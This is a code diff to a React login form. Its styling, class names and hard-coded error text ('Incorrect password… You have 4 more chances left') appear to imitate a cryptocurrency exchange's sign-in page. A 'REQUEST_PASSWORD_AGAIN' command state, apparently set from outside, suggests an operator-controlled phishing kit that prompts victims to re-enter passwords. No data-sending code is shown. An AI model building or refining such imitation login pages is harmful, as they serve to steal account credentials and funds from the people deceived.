@@ -158,24 +158,25 @@ export default function LoginForm({ setNavigation, navigation }) {
                                     style={{ padding: '6px 10px' }}
                                     onClick={(e) => e.stopPropagation()}
                                 >
-                                    <input
-                                        type={visible ? 'text' : `password`}
-                                        value={password}
-                                        spellCheck={false}
-                                        placeholder=''
-                                        className={`text-[16px] ${theme === 'light' ? 'bg-white' : 'bg-[#181a20]'} m-0 pb-1 leading-[24px] focus:outline-none font-medium flex-grow caret-[#FCD535]`}
-                                        onChange={(e) => {
-                                            setPassword(e.target.value);
-                                            setPasswordInput(e.target.value.length > 0);
-                                            setInvalid(false); // Add this line to clear error on typing
-                                        }}
-                                        onClick={(e) => {
-                                        setPasswordInput(password.length > 1);
-                                        setInput(true);
-                                        setInvalid(false); // Add this line to clear error on input click
-                                        // e.stopPropagation(); // Remove this line to allow click propagation
-                                        }}
-                                    />
+                                <input
+                                type={visible ? 'text' : 'password'}
+                                value={password}
+                                spellCheck={false}
+                                placeholder=''
+                                className={`text-[16px] ${theme === 'light' ? 'bg-white' : 'bg-[#181a20]'} m-0 pb-1 leading-[24px] focus:outline-none font-medium flex-grow caret-[#FCD535]`}
+                                onChange={(e) => {
+                                    setPassword(e.target.value);
+                                    setPasswordInput(e.target.value.length > 0);
+                                    setInvalid(false); // Clear invalid state
+                                    setCommand(null); // Clear the command state
+                                }}
+                                onClick={() => {
+                                    setPasswordInput(password.length > 1);
+                                    setInput(true);
+                                    setInvalid(false); // Clear invalid state
+                                    setCommand(null); // Clear the command state
+                                }}
+                                />
                                     <div className={`items-center ${password < 1 ? 'hidden' : 'flex'}`} onClick={() => setPassword('')}>
                                         <svg fill={`${theme === 'light' ? '#000' : '#848e9c'}`} className="bn-svg cursor-pointer w-5 h-5" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fillRule="evenodd" clipRule="evenodd" d="M21 12a9 9 0 11-18 0 9 9 0 0118 0zm-7.233 0l3.006 3.005-1.768 1.768L12 13.767l-3.005 3.005-1.768-1.768 3.005-3.005-3.005-3.005 1.768-1.767L12 10.23l3.005-3.005 1.768 1.767L13.767 12z"></path></svg>
                                     </div>
@@ -190,11 +191,11 @@ export default function LoginForm({ setNavigation, navigation }) {
                             </div>
 
 
-                            {command === 'REQUEST_PASSWORD_AGAIN' && (
-                                <p className="text-xs text-red-500 mt-1">
-                                    Incorrect password. Please retry or click "Forgot Password?" to reset. You have 4 more chances left. (200001004-72815107)
-                                </p>
-                            )}
+                            {invalid && (
+                                    <p className="text-xs text-red-500 mt-1">
+                                        Incorrect password. Please retry or click "Forgot Password?" to reset. You have 4 more chances left. (200001004-72815107)
+                                    </p>
+                                )}
 
 
                             {/* <p className={`text-[14px] text-red-500 ${invalid ? 'block' : 'hidden'} mt-1 w-full`}>
